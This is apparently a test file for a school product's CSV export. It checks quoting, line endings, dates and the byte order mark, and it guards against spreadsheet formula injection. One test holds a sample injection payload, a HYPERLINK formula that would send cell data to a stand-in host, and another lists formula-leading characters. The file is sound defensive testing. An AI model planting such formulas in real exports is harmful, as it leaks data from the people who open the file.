// @vitest-environment node

/**
 * The two things CSV writers get wrong, and the one RFC 4180 never mentions.
 *
 * Everything here is about a file leaving this product and being opened
 * somewhere else. A quoting bug shifts a column, which in a file of children
 * puts one pupil's coverage on another pupil's row; a formula-injection bug
 * turns a district's own spreadsheet into somebody else's tool.
 */

import { describe, expect, it } from 'vitest';

import { csvField, looksLikeFormula, toCsv, type CsvColumn } from './csv';

interface Row {
  name: string;
  score: number | null;
  added: Date | null;
}

const COLUMNS: ReadonlyArray<CsvColumn<Row>> = [
  { header: 'Name', value: row => row.name },
  { header: 'Score', value: row => row.score },
  { header: 'Added', value: row => row.added },
];

/** The document without its byte order mark, for asserting on structure. */
function body(csv: string): string {
  return csv.replace(/^﻿/, '');
}

describe('escaping one field', () => {
  it('leaves an ordinary value alone', () => {
    expect(csvField('Ada')).toBe('Ada');
  });

  it('quotes a value containing a comma', () => {
    /*
     * The bug that matters. An unquoted comma silently shifts every column
     * after it — a pupil named "Nguyen, Cleo" would put her coverage under
     * somebody else's heading, and the file would look perfectly well-formed.
     */
    expect(csvField('Nguyen, Cleo')).toBe('"Nguyen, Cleo"');
  });

  it('doubles an internal quote rather than escaping it', () => {
    // RFC 4180 §2.7. Backslash escaping is what everybody writes first and no
    // spreadsheet reads.
    expect(csvField('Ada "Countess" Lovelace')).toBe('"Ada ""Countess"" Lovelace"');
    expect(csvField('Ada "Countess" Lovelace')).not.toContain('\\"');
  });

  it('quotes a value containing a line break', () => {
    // A raw newline inside an unquoted field ends the record, and every column
    // after it becomes a new row with the wrong number of fields.
    expect(csvField('Elm Street\nAnnexe')).toBe('"Elm Street\nAnnexe"');
    expect(csvField('Elm\r\nStreet')).toBe('"Elm\r\nStreet"');
  });

  it('leaves an empty value empty rather than quoting it', () => {
    expect(csvField('')).toBe('');
  });
});

describe('a value a spreadsheet would evaluate', () => {
  it('recognises every leading character that starts a formula', () => {
    /*
     * `=`, `+`, `-` and `@` are the documented four; tab and carriage return
     * are here because Excel strips leading whitespace before deciding, so
     * `\t=1+1` is evaluated exactly as `=1+1` is.
     */
    for (const leader of ['=', '+', '-', '@', '\t', '\r']) {
      expect(looksLikeFormula(`${leader}1+1`), leader).toBe(true);
    }
    expect(looksLikeFormula('Ada')).toBe(false);
    expect(looksLikeFormula('')).toBe(false);
    expect(looksLikeFormula('a=b')).toBe(false);
  });

  it('prefixes it so it is displayed rather than run', () => {
    /*
     * **The one RFC 4180 says nothing about.** These names come from a
     * district's SIS — a system this product does not control and cannot vet —
     * and the person who opens the file is an administrator with every child in
     * the district on screen.
     */
    expect(csvField('=1+1')).toBe("'=1+1");
    expect(csvField('@SUM(A1:A9)')).toBe("'@SUM(A1:A9)");
  });

  it('guards a formula that also needs quoting, in the order that works', () => {
    /*
     * The prefix goes on **before** the quoting. The other order produces
     * `'"=HYPERLINK(...)"`, whose first character is an apostrophe only by
     * accident of position — a parser stripping the quotes hands back the
     * formula intact.
     */
    const attack = '=HYPERLINK("http://x/?"&A1,"click")';
    const written = csvField(attack);

    expect(written.startsWith('"\'=')).toBe(true);
    expect(written.startsWith("'\"")).toBe(false);

    // Unquoting the field the way a parser would still leaves it inert.
    const unquoted = written.slice(1, -1).replace(/""/g, '"');
    expect(unquoted.startsWith("'")).toBe(true);
  });

  it('does not mangle a negative number', () => {
    // `-3` starts with a formula leader and is also an ordinary value. It is
    // prefixed, because a spreadsheet cannot tell the two apart either and the
    // cost of being wrong is asymmetric.
    expect(csvField('-3')).toBe("'-3");
  });
});

describe('a whole document', () => {
  const rows: Row[] = [
    { name: 'Ada', score: 42, added: new Date('2026-03-01T23:30:00Z') },
    { name: 'Nguyen, Cleo', score: null, added: null },
  ];

  it('separates records with CRLF, not LF', () => {
    /*
     * RFC 4180 §2.1. A bare `\n` is read as a single unterminated record by
     * several parsers, which presents as a one-row file containing everything.
     */
    const csv = body(toCsv(rows, COLUMNS));
    expect(csv.split('\r\n')).toHaveLength(4); // header, two rows, trailing
    expect(csv.replace(/\r\n/g, '')).not.toContain('\n');
  });

  it('ends with a terminator', () => {
    expect(toCsv(rows, COLUMNS).endsWith('\r\n')).toBe(true);
  });

  it('writes the headers first, escaped like any other field', () => {
    const csv = body(toCsv(rows, [{ header: 'Name, full', value: row => row.name }]));
    expect(csv.split('\r\n')[0]).toBe('"Name, full"');
  });

  it('renders an absent value as empty rather than as "null"', () => {
    // A column of the four letters `null` is a column somebody will filter on,
    // sort by, and eventually average.
    const csv = body(toCsv(rows, COLUMNS));
    expect(csv.split('\r\n')[2]).toBe('"Nguyen, Cleo",,');
  });

  it('writes a date as an unambiguous day', () => {
    /*
     * `YYYY-MM-DD` in UTC. A district in California opening a file written by a
     * server in Frankfurt must read the same day, and `03/04/2026` is two
     * different days depending on who is looking.
     */
    const csv = body(toCsv(rows, COLUMNS));
    expect(csv.split('\r\n')[1]).toBe('Ada,42,2026-03-01');
  });

  it('carries a byte order mark, which Excel needs to read a name correctly', () => {
    /*
     * The one deliberate departure from a strict reading of RFC 4180. Without
     * it Excel guesses the system code page and a district's own pupil appears
     * as `JosÃ©`. Every mainstream parser skips it; Excel is the one that needs
     * it, and Excel is what these files are opened in.
     */
    const csv = toCsv([{ name: 'José', score: 1, added: null }], COLUMNS);
    expect(csv.charCodeAt(0)).toBe(0xfeff);
    expect(body(csv)).toContain('José');
  });

  it('writes a header-only document for no rows', () => {
    // Not an empty string. A district with no pupils yet should open a file and
    // see the columns, rather than wonder whether the export failed.
    const csv = body(toCsv([], COLUMNS));
    expect(csv).toBe('Name,Score,Added\r\n');
  });
});
